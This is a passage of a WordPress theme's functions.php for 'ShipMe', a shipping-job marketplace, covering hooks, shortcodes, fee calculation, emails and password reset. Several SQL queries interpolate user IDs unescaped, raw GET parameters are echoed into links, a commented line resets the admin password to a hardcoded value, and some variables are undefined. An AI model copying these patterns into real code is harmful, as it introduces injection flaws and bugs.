<?php

/**********************
*	MIT license
**********************/

 //wp_set_password("motor789", 1);
 	DEFINE("shipme_VERSION", "2.8.2.1");
 	DEFINE("shipme_RELEASE", "2 May 2024");

	 //----------------------------------------------------------


 	global $category_url_link;
 	$category_url_link = 'category';

 	global $raga_url_thing;
 	$raga_url_thing 	= "jobs";
 	$cc = get_option('shipme_jobs_slug_link');
 	if(!empty($cc) && shipme_using_permalinks()) $raga_url_thing = $cc;

 	add_theme_support( 'post-thumbnails' );
 	remove_action('wp_head', 'wp_generator');

 	//-------------------------

  add_filter('wp_head','shp_wp_head1');
  add_filter('show_admin_bar', '__return_false');

  // remove dashboard access or non admins





  add_action( 'admin_init',    'shipme_dashboard_redirect' );
 


  function shipme_dashboard_redirect() {

    global $pagenow;


    if ( !current_user_can( 'manage_options' ) ) {


          if($pagenow == "index.php")
          {
              wp_redirect(get_site_url());
              exit;
          }

          exit;

    }

  }

  //---

//************************************************************
 //
 //       shipme function
 //
 //************************************************************


  include 'classes/listing-fees.class.php';
  include 'classes/credits.class.php';
  include 'classes/pagination.class.php';
  include 'classes/orders.class.php';
  include 'classes/messages.class.php';
  include 'classes/escrow.class.php';

  include 'bootstrapwalker.class.php';
  include 'mobile-bootstrapwalker.class.php';
  include 'lib/first_run.php';
  include 'lib/first_run_emails.php';
  include 'lib/cronjob.php';

  //-------------------------

function shipme_filter_phone_nr($string)
{
    $re = "/^(\\d\\d)(\\d{5})(\\d{4})$/";
  $subst = '\1 \2.\3';

$result = preg_replace($re, $subst, $string, 1);

return $result;
}
  /*************************************************************
  *
  *	shipme (c) sitemile.com - function
  *
  **************************************************************/
  function shipme_provider_search_link()
  {
  	$opt = get_option('shipme_transporters_page_id');
  	$perm = shipme_using_permalinks();

  	if($perm) return get_permalink($opt). "?";

  	return get_permalink($opt). "&pg=".$subpage."&";
  }


  /*************************************************************
  *
  *	shipme (c) sitemile.com - function
  *
  **************************************************************/

  add_filter( 'wp_mail_content_type', 'shipme_set_html_mail_content_type' );

   function shipme_set_html_mail_content_type() {
       return 'text/html';
   }


   /*************************************************************
   *
   *	shipme (c) sitemile.com - function
   *
   **************************************************************/

   function shipme_advanced_search_link_pgs($pg)
   {
   	$opt = get_option('shipme_adv_search_page_id');
   	$perm = shipme_using_permalinks();

   	$acc = 'pj='.$pg."&";
   	foreach($_GET as $key=>$value)
   	{
   		if($key != 'pj' and $key != 'page_id')
   		$acc .= $key."=".$value."&";
   	}

   	if($perm) return get_permalink($opt). "?" . $acc;

   	return get_permalink($opt). "&".$acc;
   }

   /*************************************************************
   *
   *	shipme (c) sitemile.com - function
   *
   **************************************************************/

   function shipme_count_in_progress_jobs_freelancer($uid)
   {

     global $wpdb;
     $prf = $wpdb->prefix;
     $s = "select SQL_CALC_FOUND_ROWS * from ".$prf."ship_orders orders where orders.transporter='$uid' and orders.order_status='0' order by id='desc' limit 0, 1";
     $r = $wpdb->get_results($s);

     $total_rows   = shipme_get_last_found_rows();
     return $total_rows;

   }


   /*************************************************************
   *
   *	shipme (c) sitemile.com - function
   *
   **************************************************************/

   function shipme_count_in_progress_jobs_owner($uid)
   {

     global $wpdb;
     $prf = $wpdb->prefix;
     $s = "select SQL_CALC_FOUND_ROWS * from ".$prf."ship_orders orders where orders.buyer='$uid' and orders.order_status='0' order by id='desc' limit 0, 1";
     $r = $wpdb->get_results($s);

     $total_rows   = shipme_get_last_found_rows();
     return $total_rows;

   }

   /*************************************************************
   *
   *	shipme (c) sitemile.com - function
   *
   **************************************************************/


   function shipme_count_reviews_i_have_to_award($uid)
    {

      global $wpdb;
      $query = "select SQL_CALC_FOUND_ROWS id from ".$wpdb->prefix."ship_ratings where fromuser='$uid' AND awarded='0'";
      $r = $wpdb->get_results($query);

      $total_rows   = shipme_get_last_found_rows();
      return $total_rows;

    }





        /*************************************************************
        *
        *	shipme (c) sitemile.com - function
        *
        **************************************************************/

   function shipme_count_active_quotes($uid)
   {
     global $wpdb;
     $prf = $wpdb->prefix;

     $s = "select SQL_CALC_FOUND_ROWS * from ".$prf."ship_bids bids, ".$prf."postmeta pmeta, ".$prf."posts posts where posts.ID=pmeta.post_id and posts.post_type='job_ship' and
     posts.post_status='publish' and posts.post_author='$uid' and pmeta.meta_key='winner' and pmeta.meta_value='0' and bids.pid=posts.ID order by posts.ID desc limit 0, 2";
     $r = $wpdb->get_results($s);

     $total_rows   = shipme_get_last_found_rows();
     return $total_rows;


   }


   function shipme_get_number_of_delivered_of_my_jobs($uid)
   {
     global $wpdb;
     $prf = $wpdb->prefix;
     $s = "select SQL_CALC_FOUND_ROWS * from ".$prf."ship_orders orders where orders.buyer='$uid' and order_status='1' order by id='desc' limit 0, 1";
     $r = $wpdb->get_results($s);

     $total_rows   = shipme_get_last_found_rows();
     return $total_rows;
   }

   /*************************************************************
   *
   *	shipme (c) sitemile.com - function
   *
   **************************************************************/

 function shipme_theme_init_lan()
 {
             load_theme_textdomain('shipme', get_template_directory() .  '/languages');
         }
         add_action ('init', 'shipme_theme_init_lan');


//-------------------------

 add_image_size( 'avatar_square_picture', 250, 250,  true );
  add_image_size( 'avatar_square_picture2', 500, 500,  true );

// template parts
add_action("manage_job_ship_posts_custom_column", 	"shipme_my_custom_columns");
add_filter("manage_edit-job_ship_columns", 			"shipme_my_projects_columns");


get_template_part( 'template-parts/general-stuff/general-design-parts' );
get_template_part( 'template-parts/regular-page/header-area-regular-page' );
get_template_part( 'template-parts/home-page/front-page-slider' );
get_template_part( 'template-parts/home-page/header-area-home' );
get_template_part( 'template-parts/login-register/accounts-registration' );
get_template_part( 'template-parts/login-register/login' );
get_template_part( 'template-parts/login-register/register' );
get_template_part( 'template-parts/user-area/my-account/my-account' );
get_template_part( 'template-parts/user-area/my-account/profile-settings' );
get_template_part( 'template-parts/user-area/my-account/finances' );
get_template_part( 'template-parts/user-area/my-account/my-quotes' );
get_template_part( 'template-parts/user-area/my-account/my-jobs' );
get_template_part( 'template-parts/user-area/my-account/messages' );
get_template_part( 'template-parts/user-area/my-account/reviews' );
get_template_part( 'template-parts/user-area/my-account/order-page' );


get_template_part( 'template-parts/advanced-search/advanced-search-page' );
get_template_part( 'template-parts/advanced-search/transporters-search' );
get_template_part( 'template-parts/post-new/helper-functions' );
get_template_part( 'template-parts/post-new/post-new' );
get_template_part( 'template-parts/post-new/pay-listing-credits' );


//----------------------


 get_template_part( 'lib/admin_menu' );
 get_template_part( 'lib/widgets/home-widget-content' );
 get_template_part( 'lib/widgets/latest-posted-jobs-big' );
 get_template_part( 'lib/widgets/wide-picture-accross' );
 get_template_part( 'lib/widgets/big-map-accross' );
get_template_part( 'lib/widgets/job-categories-text' );
get_template_part( 'lib/widgets/search-box-big' );



 //---------------------------------------------

 add_action('init', 'shipme_create_post_type' );
 add_action('init', 'shipme_do_login_register_init', 99);
 add_action('template_redirect',	 									'shipme_template_redirect' );
 add_action('widgets_init',	 										'shipme_framework_init_widgets' );
 add_action('query_vars', 											'shipme_add_query_vars');

 add_action('admin_head', 										'shipme_admin_style_sheet');
 add_action('admin_menu',										'shipme_set_admin_menu');
 add_action('save_post',											'shipme_save_custom_fields');
 add_action('generate_rewrite_rules', 'shipme_rewrite_rules' );




   add_shortcode( 'shipme_theme_my_account_my_jobs', 							'shipme_theme_my_account_my_jobs_fnc' );
   add_shortcode( 'shipme_theme_transporters', 							'shipme_transporters_page' );
 add_shortcode( 'shipme_theme_post_new', 							'shipme_theme_post_new_function_fn' );
 add_shortcode( 'shipme_theme_my_account_home_new', 					'shipme_theme_my_account_home_new' );
 add_shortcode( 'shipme_theme_my_account_pm_new', 					'shipme_theme_my_account_pm_new' );
 add_shortcode( 'shipme_theme_my_account_profile_settings_new', 		'shipme_theme_my_account_profile_settings_new' );
 add_shortcode( 'shipme_theme_my_account_finances_new', 				'shipme_theme_my_account_finances_new' );
 add_shortcode( 'shipme_theme_my_account_active_jobs_new', 						'shipme_theme_my_account_active_jobs_fnc' );
 add_shortcode( 'shipme_theme_my_account_received_offers_new', 						'shipme_theme_my_account_received_off_fnc' );
 add_shortcode( 'shipme_theme_my_account_pending_delivery_new', 						'shipme_theme_my_account_pending_del_fnc' );
 add_shortcode( 'shipme_theme_my_account_delivered_jobs_new', 						'shipme_theme_my_account_del_jbs_fnc' );
 add_shortcode( 'shipme_theme_my_account_outstanding_payments_new', 						'shipme_theme_my_account_outs_payments_fnc' );
 add_shortcode( 'shipme_theme_my_account_completed_payments_new', 						'shipme_theme_my_account_compl_payments_fnc' );
 add_shortcode( 'shipme_theme_my_account_compl_jobs_new', 						'shipme_theme_my_account_compl_jbs_fnc' );
 add_shortcode( 'shipme_theme_my_account_posted_offers_new', 						'shipme_theme_my_account_posted_offers_fnc' );
 add_shortcode( 'shipme_theme_my_account_pending_jobs_new', 						'shipme_theme_my_account_pending_jobs_fnc' );
 add_shortcode( 'shipme_theme_my_account_awaiting_payments_new', 						'shipme_theme_my_account_awaiting_payments_fnc' );
 add_shortcode( 'shipme_theme_my_account_reviews_new', 						'shipme_theme_my_account_reviews_fnc' );
  add_shortcode( 'shipme_post_new_pay_listing_cred', 						'shipme_theme_pay_listing_credits_function_fn' );
   add_shortcode( 'shipme_theme_transporters', 						'shipme_theme_transporters_fnc' );
    add_shortcode( 'shipme_theme_my_account_order_page', 						'shipme_theme_my_account_order_page_fnc' );




 add_shortcode( 'shipme_theme_my_account_pay_comm_new', 						'shipme_theme_my_account_pay_comm_fnc' );
 add_shortcode( 'shipme_login_page', 						'shipme_login_page_fnc' );
  add_shortcode( 'shipme_register_page', 						'shipme_register_page_fnc' );
   add_shortcode( 'shipme_adv_search', 						'shipme_theme_advance_search_page_new' );
    add_shortcode( 'shipme_theme_my_account_reviews_new', 						'shipme_theme_my_account_reviews_new_fnc' );


    add_shortcode( 'shipme_theme_my_account_my_quotes', 						'shipme_theme_my_account_my_quotes_fnc' );
      add_shortcode( 'shipme_theme_my_account_pm_new', 							'shipme_theme_my_account_messages_fnc' );


 add_filter('wp_mail_from', 'SHIPME_new_mail_from');
 add_filter('wp_mail_from_name', 'SHIPME_new_mail_from_name');


 add_filter('shipme_top_header_below_wp_head','shipme_top_header_below_wp_head_css');


  //************************************************************
 //
 //       shipme function
 //
 //************************************************************



 function shipme_top_header_below_wp_head_css()
 {

   $shipme_color_background_buttons = get_option('shipme_color_background_buttons');
       $shipme_text_color_button = get_option('shipme_text_color_button');



       $shipme_color_background_buttons_hover = get_option('shipme_color_background_buttons_hover');
           $shipme_text_color_button_hover = get_option('shipme_text_color_button_hover');


           $shipme_color_for_links        = get_option('shipme_color_for_links');
           $shipme_color_for_links_hover  = get_option('shipme_color_for_links_hover');



    ?>

        <style>

        <?php if(!empty($shipme_color_background_buttons)) { ?>


          .wizard > .steps .current a, .wizard > .steps .current a:hover, .wizard > .steps .current a:active
          {
                background-color: <?php echo $shipme_color_background_buttons ?>;
                  color:   <?php echo $shipme_text_color_button ?>;


          }


          .wizard-style-2 > .steps > ul .current a .number, .wizard-style-2 > .steps > ul .current a:hover .number, .wizard-style-2 > .steps > ul .current a:active .number
          {
            border-color: <?php echo $shipme_color_background_buttons ?>;
                color: <?php echo $shipme_color_background_buttons ?>;
          }


          .ship-navbar .nav-item.active .nav-link
          {
            background-color: <?php echo $shipme_color_background_buttons ?>;
            color:   <?php echo $shipme_text_color_button ?>;
            background-image: none
          }


          .btn-outline-primary {
                  color: <?php echo $shipme_color_background_buttons ?>;
                  border-color: <?php echo $shipme_color_background_buttons ?>;
              }
  .btn-outline-primary:hover {


        color: <?php echo $shipme_text_color_button_hover ?>;
        border-color: <?php echo $shipme_text_color_button_hover ?>;
        background-color: <?php echo $shipme_color_background_buttons_hover ?>;
  }

          .btn-ship-purchase
          {
            background-color: <?php echo $shipme_color_background_buttons ?>;
            color:   <?php echo $shipme_text_color_button ?>;
          }

          .btn-ship-demo
          {
            border-color: <?php echo $shipme_color_background_buttons ?>;
            color: <?php echo $shipme_color_background_buttons ?>;
          }

          .btn-ship-demo:hover
          {
              background: <?php echo $shipme_color_background_buttons ?>;
              color: <?php echo $shipme_text_color_button ?>
          }

          .btn-primary
          {
            background:  <?php echo $shipme_color_background_buttons ?>;
            background-color: <?php echo $shipme_color_background_buttons ?>;
              border-color: white;
          }

          .search-box .btn, .search-box .sp-container button, .sp-container .search-box button
          {
            background:  <?php echo $shipme_color_background_buttons ?>;
            background-color: <?php echo $shipme_color_background_buttons ?>;

          }

          <?php } ?>



          <?php if(!empty($shipme_text_color_button)) { ?>

            .btn-primary
            {
              color:  <?php echo $shipme_text_color_button ?>
            }


            .search-box .btn, .search-box .sp-container button, .sp-container .search-box button
            {
            color: <?php echo $shipme_text_color_button ?>

            }

            <?php } ?>

            .pagination .active .page-link, .pagination .active .page-link:hover, .pagination .active .page-link:focus
            {
              background-color:  <?php echo $shipme_color_for_links ?>
            }

            a
            {
              color: <?php echo $shipme_color_for_links ?>
            }

            a:hover
            {
              color: <?php echo $shipme_color_for_links_hover ?>
            }

            <?php if(!empty($shipme_color_background_buttons_hover)) { ?>

            .btn-primary:hover {
                  color:  <?php echo $shipme_text_color_button_hover ?>;
                  background-color:  <?php echo $shipme_color_background_buttons_hover ?>;
                  border-color: white;
              }


                  .btn-ship-purchase:hover, .btn-ship-purchase:focus {
                      color: <?php echo $shipme_text_color_button_hover ?>;;
                      background-color:<?php echo $shipme_color_background_buttons_hover ?>;
                  }

              <?php } ?>
        </style>


    <?php


 }

 //************************************************************
 //
 //       shipme function
 //
 //************************************************************

 function shipme_get_post_new_pay_balance($pid, $agree = '')
 {
   $id = get_option('shipme_post_new_pay_balance_page_id');
   if(shipme_using_permalinks()) return get_permalink($id) . "?pid=" . $pid. $agree;

    return get_permalink($id) . "&pid=" . $pid . $agree;
 }


 function shipme_get_thread_link($thid)
 {
   $id = get_option('shipme_private_messages_page_id');
   if(shipme_using_permalinks()) return get_permalink($id) . "?thid=" . $thid. $agree;

    return get_permalink($id) . "&thid=" . $thid . $agree;

 }


 //************************************************************
 //
 //       shipme function
 //
 //************************************************************
function shipme_get_link_of_page_and_get_parameter($page_id, $params = '')
{
  if(shipme_using_permalinks()) $link = get_permalink(get_option($page_id)) . "?" . $params;
  else $link = get_permalink(get_option($page_id)) . '&' . $params;

  return $link;
}

/*************************************************************
*
*	shipme (c) sitemile.com - function
*
**************************************************************/
function shipme_get_last_found_rows()
{
	global $wpdb;

	$total_rows   = "SELECT FOUND_ROWS() as totalrows;";
	$r_prs        = $wpdb->get_results($total_rows);
	$total_rows   = $r_prs[0]->totalrows;

	return $total_rows;
}

 //************************************************************
 //
 //       shipme function
 //
 //************************************************************



 function shipme_get_link_with_page($pid, $pg = '', $addition = '')
 {
 	if(shipme_using_permalinks() == true)
 	{
 		return get_permalink($pid) . "?pg=" . $pg . $addition;
 	}
 	else return get_permalink( $pid ). "&pg=" . $pg . $addition;
 }

 //************************************************************
 //
 //       shipme function
 //
 //************************************************************

   function shp_wp_head1()
   {
     ?>
     <script type="text/javascript" src="https://maps.google.com/maps/api/js?key=<?php echo get_option('shipme_radius_maps_api_key'); ?>" async defer></script>
   <script src="https://maps.googleapis.com/maps/api/js?signed_in=true&libraries=places&key=<?php echo get_option('shipme_radius_maps_api_key') ?>" async defer></script>


     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">

     <?php
   }

   //************************************************************
   //
   //       shipme function
   //
   //************************************************************
   function shipme_check_list_emails($termid, $row)
   {
   	if(count($row) > 0)
   	foreach($row as $term)
   	{
   		if($term->catid == $termid) return 1;
   	}
   	return 0;
   }

   //************************************************************
   //
   //       shipme function
   //
   //************************************************************

 function shipme_is_job_featured($pid)
 {
   $featured = get_post_meta($pid, 'featured', true);
   if($featured == 1) return true;
 }
 //************************************************************
 //
 //       shipme function
 //
 //************************************************************
 function shipme_is_job_private_bidding($pid)
 {
   $x = get_post_meta($pid, 'sealed_bidding', true);
   if($x == 1) return true;
 }
 //************************************************************
 //
 //       shipme function
 //
 //************************************************************

 function shipme_is_job_hidden_job($pid)
 {
   $x = get_post_meta($pid, 'private', true);
   if($x == 1) return true;
 }

function ship_calculate_listing_fees_of_job($pid)
{

  //---- sealed bidding fee ---

  $shipme_sealed_bidding_fee = get_option('shipme_sealed_bidding_fee');
  if(!empty($shipme_sealed_bidding_fee))
  {
    $opt = get_post_meta($pid,'sealed_bidding',true);
    if($opt != "1") { $shipme_sealed_bidding_fee = 0; }


  } else $shipme_sealed_bidding_fee = 0;

  $sealed_bidding_fee_paid = get_post_meta($pid, 'sealed_bidding_fee_paid', true);
  if($sealed_bidding_fee_paid == 1) $shipme_sealed_bidding_fee = 0;

  //------- featured fee

  $featured	  = get_post_meta($pid, 'featured', true);
  $feat_charge = get_option('shipme_featured_fee');

  if($featured != "1" ) $feat_charge = 0;

  $featured_fee_paid = get_post_meta($pid, 'featured_fee_paid', true);
  if($featured_fee_paid == 1) $feat_charge = 0;


  //------- private job fee

  $private	         = get_post_meta($pid, 'private', true);
  $private_charge    = get_option('shipme_private_job_fee');

  if($private != "1" ) $private_charge = 0;

  $private_fee_paid = get_post_meta($pid, 'private_fee_paid', true);
  if($private_fee_paid == 1) $private_charge = 0;

  //------------------------

  $custom_set = get_option('shipme_enable_custom_posting');
  if($custom_set == 'yes')
  {
    $posting_fee = get_option('shipme_theme_custom_cat_'.$catid);
    if(empty($posting_fee)) $posting_fee = 0;
  }
  else
  {
    $posting_fee = get_option('shipme_base_fee');
    if(empty($posting_fee)) $posting_fee = 0;
  }

  $total = $feat_charge + $posting_fee + $shipme_sealed_bidding_fee + $private_charge + $shipme_get_images_cost_extra;

  //-----------------------------------------------

    $payment_arr = array();

    $base_fee_paid 	= get_post_meta($pid, 'base_fee_paid', true);

    if($base_fee_paid != "1" and $posting_fee > 0)
    {
      $my_small_arr = array();
      $my_small_arr['fee_code'] 		= 'base_fee';
      $my_small_arr['show_me'] 		= true;
      $my_small_arr['amount'] 		= $posting_fee;
      $my_small_arr['description'] 	= __('Base Fee','shipme');
      array_push($payment_arr, $my_small_arr);
    }
    //-----------------------

    if($feat_charge2 > 0)
    {
      $my_small_arr = array();
      $my_small_arr['fee_code'] 		= 'extra_img';
      $my_small_arr['show_me'] 		= true;
      $my_small_arr['amount'] 		= $shipme_get_images_cost_extra;
      $my_small_arr['description'] 	= __('Extra Images Fee','shipme');
      array_push($payment_arr, $my_small_arr);
      //------------------------
    }

    if($feat_charge > 0)
    {
      $my_small_arr = array();
      $my_small_arr['fee_code'] 		= 'feat_fee';
      $my_small_arr['show_me'] 		= true;
      $my_small_arr['amount'] 		= $feat_charge;
      $my_small_arr['description'] 	= __('Featured Fee','shipme');
      array_push($payment_arr, $my_small_arr);
      //------------------------
    }




    if($private_charge > 0)
    {
      $my_small_arr = array();
      $my_small_arr['fee_code'] 		= 'priv_fee';
      $my_small_arr['show_me'] 		= true;
      $my_small_arr['amount'] 		= $private_charge;
      $my_small_arr['description'] 	= __('Private Job Fee','shipme');
      array_push($payment_arr, $my_small_arr);
      //------------------------
    }


    if($shipme_sealed_bidding_fee > 0)
    {

      $my_small_arr = array();
      $my_small_arr['fee_code'] 		= 'sealed_job';
      $my_small_arr['show_me'] 		= true;
      $my_small_arr['amount'] 		= $shipme_sealed_bidding_fee;
      $my_small_arr['description'] 	= __('Sealed Bidding Fee','shipme');
      array_push($payment_arr, $my_small_arr);
    //------------------------
    }



    $payment_arr 	= apply_filters('shipme_filter_payment_array', $payment_arr, $pid);
    $new_total 		= 0;

    foreach($payment_arr as $payment_item):
      if($payment_item['amount'] > 0):
        $new_total += $payment_item['amount'];
      endif;
    endforeach;

    $ret = array();
    $ret['total'] = $new_total;
    $ret['arr'] = $payment_arr;


    return $ret;

}





 function shipme_my_projects_columns($columns) //this function display the columns headings
 {
 	$columns = array(
 		"cb" 		=> "<input type=\"checkbox\" />",
 		"title" 	=> __("Job Title","shipme"),
 		"author" 	=> __("Author","shipme"),
 		"posted" 	=> __("Posted On","shipme"),
 		"price"		=> __("Price","shipme"),
 		"exp" 		=> __("Expires in","shipme"),
 		"feat" 		=> __("Featured","shipme"),
 		"approveds" 		=> __("Approved","shipme"),
 		"thumbnail" => __("Thumbnail","shipme"),
 		"options" 	=> __("Options","shipme")
 	);
 	return $columns;
 }




 function shipme_my_custom_columns($column)
 {
 	global $post;
 	if ("ID" == $column) echo $post->ID; //displays title
 	elseif ("description" == $column) echo $post->ID; //displays the content excerpt
 	elseif ("posted" == $column) echo date_i18n('jS \of F, Y \<\b\r\/\>H:i:s',strtotime($post->post_date)); //displays the content excerpt
 	elseif ("thumbnail" == $column)
 	{
 		echo '<a href="'.home_url().'/wp-admin/post.php?post='.$post->ID.'&action=edit"><img class="image_class"
 	src="'.shipme_get_first_post_image($post->ID,75,65).'" width="75" height="65" /></a>'; //shows up our post thumbnail that we previously created.
 	}

 	elseif ("author" == $column)
 	{
 		echo $post->post_author;
 	}

 	elseif ("approveds" == $column)
 	{
 		$paid = get_post_meta($post->ID, 'paid', true);

 		if($post->post_status == "draft") echo "No";
 		else echo "Yes";
 	}

 	elseif ("feat" == $column)
 	{
 		$f = get_post_meta($post->ID,'featured', true);
 		if($f == "1") echo __("Yes","shipme");
 		else  echo __("No","shipme");
 	}

 	elseif ("price" == $column)
 	{
 		echo shipme_get_show_price(get_post_meta($post->ID,'price',true));
 	}

 	elseif ("exp" == $column)
 	{
 		$ending = get_post_meta($post->ID, 'ending', true);
 		echo shipme_prepare_seconds_to_words($ending - current_time('timestamp',0));
 	}

 	elseif ("options" == $column)
 	{
 		echo '<div style="padding-top:20px">';
 		echo '<a class="button action" href="'.home_url().'/wp-admin/post.php?post='.$post->ID.'&action=edit">Edit</a> ';
 		echo '<a class="button action" href="'.get_permalink($post->ID).'" target="_blank">View</a> ';
 		echo '<a class="button action" href="'.get_delete_post_link($post->ID).'">Trash</a> ';
 		echo '</div>';
 	}

 }


 function shipme_prepare_seconds_to_words($seconds)
 	{
 		$res = shipme_seconds_to_words_new($seconds);
 		if($res == "Expired") return __('Expired','shipme');

 		if($res[0] == 0) return sprintf(__("%s hours, %s min, %s sec",'shipme'), $res[1], $res[2], $res[3]);
 		if($res[0] == 1){

 			$plural = $res[1] > 1 ? __('days','shipme') : __('day','shipme');
 			return sprintf(__("%s %s, %s hours, %s min",'shipme'), $res[1], $plural , $res[2], $res[3]);
 		}
 	}


  function shipme_seconds_to_words_new($seconds)
  {
  		if($seconds < 0 ) return 'Expired';

          /*** number of days ***/
          $days=(int)($seconds/86400);
          /*** if more than one day ***/
          $plural = $days > 1 ? 'days' : 'day';
          /*** number of hours ***/
          $hours = (int)(($seconds-($days*86400))/3600);
          /*** number of mins ***/
          $mins = (int)(($seconds-$days*86400-$hours*3600)/60);
          /*** number of seconds ***/
          $secs = (int)($seconds - ($days*86400)-($hours*3600)-($mins*60));
          /*** return the string ***/
                  if($days == 0 || $days < 0)
  				{
  					$arr[0] = 0;
  					$arr[1] = $hours;
  					$arr[2] = $mins;
  					$arr[3] = $secs;
  					return $arr;//sprintf("%d hours, %d min, %d sec", $hours, $mins, $secs);
  				}
  				else
  				{
  					$arr[0] = 1;
  					$arr[1] = $days;
  					$arr[2] = $hours;
  					$arr[3] = $mins;

  					return $arr; //sprintf("%d $plural, %d hours, %d min", $days, $hours, $mins);
          		}

  }

  /*======================================================
  *
  *	    // function shipme
  *
  *======================================================*/

  function shipme_new_user_notification($user_id, $plaintext_pass = '') {
  	$user = new WP_User($user_id);

  	$subject 	= get_option('shipme_new_user_email_subject');
  	$message 	= get_option('shipme_new_user_email_message');

  	$user_login = stripslashes($user->user_login);
  	$user_email = stripslashes($user->user_email);

  	$site_login_url = shipme_login_url();
  	$site_name 		= get_bloginfo('name');
  	$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));

  	$find 		= array('##username##', '##user_email##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##user_password##');
  	$replace 	= array($user_login, $user_email, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $plaintext_pass);
  	$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
  	$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

  	//---------------------------------------------

  	shipme_send_email($user_email, $subject, $message);

  }
  /*======================================================
  *
  *	    // function shipme
  *
  *======================================================*/
  function shipme_new_user_notification_admin($user_id) {
  	$user = new WP_User($user_id);

  	$subject 	= get_option('shipme_new_user_email_admin_subject');
  	$message 	= get_option('shipme_new_user_email_admin_message');

  	$user_login = stripslashes($user->user_login);
  	$user_email = stripslashes($user->user_email);

  	$site_login_url = shipme_login_url();
  	$site_name 		= get_bloginfo('name');
  	$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));

  	$find 		= array('##username##', '##user_email##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##user_password##');
  	$replace 	= array($user_login, $user_email, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $plaintext_pass);
  	$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
  	$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

  	//---------------------------------------------

  	$email = get_bloginfo('admin_email');
  	if(!empty($user_email))
  	shipme_send_email($email, $subject, $message);

  }

  /*======================================================
  *
  *	    // function shipme
  *
  *======================================================*/


  if ( !function_exists('my_retrieve_password') ) :
  function my_retrieve_password()
  {

  	global  $wpdb, $current_site;

  	$errors = new WP_Error();

  	if ( empty( $_POST['user_login'] ) ) {
  		$errors->add('empty_username', __('<strong>ERROR</strong>: Enter a username or e-mail address.', 'shipme'));
  	} else if ( strpos( $_POST['user_login'], '@' ) ) {
  		$user_data = get_user_by( 'email', trim( $_POST['user_login'] ) );
  		if ( empty( $user_data ) )
  			$errors->add('invalid_email', __('<strong>ERROR</strong>: There is no user registered with that email address.', 'shipme'));
  	} else {
  		$login = trim($_POST['user_login']);
  		$user_data = get_user_by('login', $login);
  	}


  	do_action('lostpassword_post');

  	if ( $errors->get_error_code() )
  		return $errors;

  	if ( !$user_data ) {
  		$errors->add('invalidcombo', __('<strong>ERROR</strong>: Invalid username or e-mail.', 'shipme'));
  		return $errors;
  	}

  	// redefining user_login ensures we return the right case in the email
  	$user_login = $user_data->user_login;
  	$user_email = $user_data->user_email;

  	do_action('retreive_password', $user_login);  // Misspelled and deprecated
  	do_action('retrieve_password', $user_login);

  	$allow = apply_filters('allow_password_reset', true, $user_data->ID);

  	if ( ! $allow )
  		return new WP_Error('no_password_reset', __('Password reset is not allowed for this user', 'shipme'));
  	else if ( is_wp_error($allow) )
  		return $allow;

  	$key = $wpdb->get_var($wpdb->prepare("SELECT user_activation_key FROM $wpdb->users WHERE user_login = %s", $user_login));
  	if ( empty($key) ) {
  		// Generate something random for a key...
  		$key = wp_generate_password(20, false);
  		do_action('retrieve_password_key', $user_login, $key);
  		// Now insert the new md5 key into the db
  		$wpdb->update($wpdb->users, array('user_activation_key' => $key), array('user_login' => $user_login));
  	}

    $shipme_login_page_id = get_option('shipme_login_page_id');
    if(shipme_using_permalinks()) $url_log = get_permalink( $shipme_login_page_id ). '?';
    else $url_log = get_permalink( $shipme_login_page_id ). '&';

  	$message = __('Someone requested that the password be reset for the following account:', 'shipme') . "\r\n\r\n";
  	$message .= network_site_url() . "\r\n\r\n";
  	$message .= sprintf(__('Username: %s', 'shipme'), $user_login) . "\r\n\r\n";
  	$message .= __('If this was a mistake, just ignore this email and nothing will happen.', 'shipme') . "\r\n\r\n";
  	$message .= __('To reset your password, visit the following address:' ,'shipme') . "\r\n\r\n";
  	$message .=  $url_log .  "action=recoverpass&key=$key&login=" . rawurlencode($user_login)   . "\r\n";

  	if ( is_multisite() )
  		$blogname = $GLOBALS['current_site']->site_name;
  	else
  		// The blogname option is escaped with esc_html on the way into the database in sanitize_option
  		// we want to reverse this for the plain text arena of emails.
  		$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);

  	$title = sprintf( __('[%s] Password Reset', 'shipme'), $blogname );

  	$title = apply_filters('retrieve_password_title', $title);
  	$message = apply_filters('retrieve_password_message', $message, $key);

  	if ( $message && !wp_mail($user_email, $title, $message) )
  		wp_die( __('The e-mail could not be sent.', 'shipme') . "<br />\n" . __('Possible reason: your host may have disabled the
  		mail() function...', 'shipme') );


      return true;

  		}
  endif;

  /*======================================================
  *
  *	    // display custom admin notice
  *
  *======================================================*/

 function shp_get_latest_version_from_our_site()
 {
       $opt = get_option('sh_get_latest_version_from_our_site');
       $tm  = current_time('timestamp');
       $ret = get_option('official_sh_ver');

       if($opt < $tm)
       {
           $response  = wp_remote_get("https://sitemile.com/?get_shipme_theme_version=1");

           if ( is_array( $response ) ) {
               $header = $response['headers']; // array of http header lines
               $ver = $response['body']; // use the content
             } else $ver = shipme_VERSION;

           update_option('official_sh_ver', $ver);
           update_option('sh_get_latest_version_from_our_site', ($tm + 9000));
           $ret = $ver;
       }

       return $ret;
 }

 /*======================================================
 *
 *	    // display custom admin notice
 *
 *======================================================*/

 function shp_update_custom_admin_notice() {

   $get_latest_version = shp_get_latest_version_from_our_site();

   if(shipme_VERSION != $get_latest_version)
   {

   ?>

   <div class="notice notice-success is-dismissible">
     <p>There is a new update available for your ShipMe Theme. Login to <b><a href="https://sitemile.com" target="_blank">www.sitemile.com</a></b> to your account in order to download the new update. </p>
   </div>

 <?php }}
 add_action('admin_notices', 'shp_update_custom_admin_notice');

 /*======================================================
 *
 *	    function here
 *
 *======================================================*/
function shipme_account_side_profile_account($uid)
{

  ?>

  <div class="card card-profile mb-4 shadow-me">
    <div class="card-body">
